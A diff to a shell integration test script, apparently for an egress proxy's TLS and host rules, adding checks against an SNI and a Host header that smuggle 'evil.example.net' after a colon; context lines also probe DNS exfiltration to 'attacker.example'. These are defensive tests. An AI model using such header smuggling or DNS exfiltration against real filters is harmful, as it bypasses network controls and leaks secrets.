@@ -244,6 +244,17 @@ echo "=== [Regex TLS rule] ==="
 OUT=$($S --insecure https://tlspass.example.com:8443/public/x)
 check_ok "GET tlspass.example.com:8443 (passthrough)" "$OUT" "PUBLIC GET"
 
+# SNI = tlsany.example.com:x.evil.example.net, which ~^tlsany\.example\.com:.*$
+# would match and the resolver then look up under evil.example.net.
+echo "=== [SNI holding a colon] ==="
+(printf '\x16\x03\x01\x00\x5d\x01\x00\x00\x59\x03\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\xff\x01\x00\x00\x2e\x00\x00\x00\x2a\x00\x28\x00\x00\x25\x74\x6c\x73\x61\x6e\x79\x2e\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f\x6d\x3a\x78\x2e\x65\x76\x69\x6c\x2e\x65\x78\x61\x6d\x70\x6c\x65\x2e\x6e\x65\x74' \
+ | nc -w 5 allowed.example.com 443 > /dev/null 2>&1 || true)
+echo "  sent (checked in the report, see integration-test-inspect-restrict.sh)"
+
+echo "=== [Host holding a colon] ==="
+CODE=$(curl -sS -o /dev/null -w "%{http_code}" --max-time 10 -H 'Host: anyport.example.com:x.evil.example.net:80' http://allowed.example.com/public/x)
+check_status "Host anyport.example.com:x.evil.example.net:80" "$CODE" "400"
+
 echo "=== [DNS-only exfiltration] ==="
 (nslookup SECRET-IN-A-NAME.attacker.example >/dev/null 2>&1 || true)
 echo "  queried (checked in the report, see integration-test-inspect-restrict.sh)"
